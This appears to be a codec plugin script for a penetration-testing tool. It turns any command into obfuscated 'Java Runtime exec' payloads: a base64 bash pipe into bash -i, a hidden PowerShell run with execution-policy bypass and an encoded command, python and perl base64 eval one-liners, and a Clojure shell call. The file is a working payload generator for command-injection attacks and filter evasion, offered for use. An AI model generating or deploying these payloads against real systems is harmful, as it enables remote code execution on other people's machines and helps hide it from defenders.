# codec plugin

/*
Codec Plugin 可以支持在 Codec 中自定义编码解码，自定义 Bypass 与字符串处理函数

函数定义非常简单

func BashCmdWrapper(cmd string) string {
	return fmt.Sprintf("bash -c {echo,%v}|{base64,-d}|{bash,-i}", codec.EncodeBase64(cmd))
}

func PowerShellCmdWrapper(cmd string) string {
	return fmt.Sprintf("powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc %v", codec.EncodeBase64(cmd))
}

func PythonCmdWrapper(cmd string) string {
	return fmt.Sprintf("python -c exec('%v'.decode('base64'))", codec.EncodeBase64(cmd))
}

func PerlCmdWrapper(cmd string) string {
	return fmt.Sprintf("perl -MMIME::Base64 -e eval(decode_base64('%v'))", codec.EncodeBase64(cmd))
}

func ClojureCmdWrapper(cmd string) string {
	return fmt.Sprintf(`(use '[clojure.java.shell :only [sh]]) (sh \"%v\")`, cmd)
}

func(i: string) string
*/

handle = func(origin /*string*/) {
    # handle your origin str
    lines = [
        sprintf("# Java Runtime exec Payload Generate"),
        sprintf("# "),
        sprintf("# Bash Base64"),
	    sprintf("bash -c {echo,%v}|{base64,-d}|{bash,-i}", codec.EncodeBase64(origin)),
        "",
        sprintf("# Powershell Base64"),
	    sprintf("powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc %v", codec.EncodeBase64(origin)),
        "",
        sprintf("# Python Base64"),
	    sprintf("python -c exec('%v'.decode('base64'))", codec.EncodeBase64(origin)),
        "",
        sprintf("# Perl Base64"),
	    sprintf("perl -MMIME::Base64 -e eval(decode_base64('%v'))", codec.EncodeBase64(origin)),
        "",
        sprintf("(use '[clojure.java.shell :only [sh]]) (sh \"%v\")", origin),
    ]
    return str.Join(lines, "\n")
}
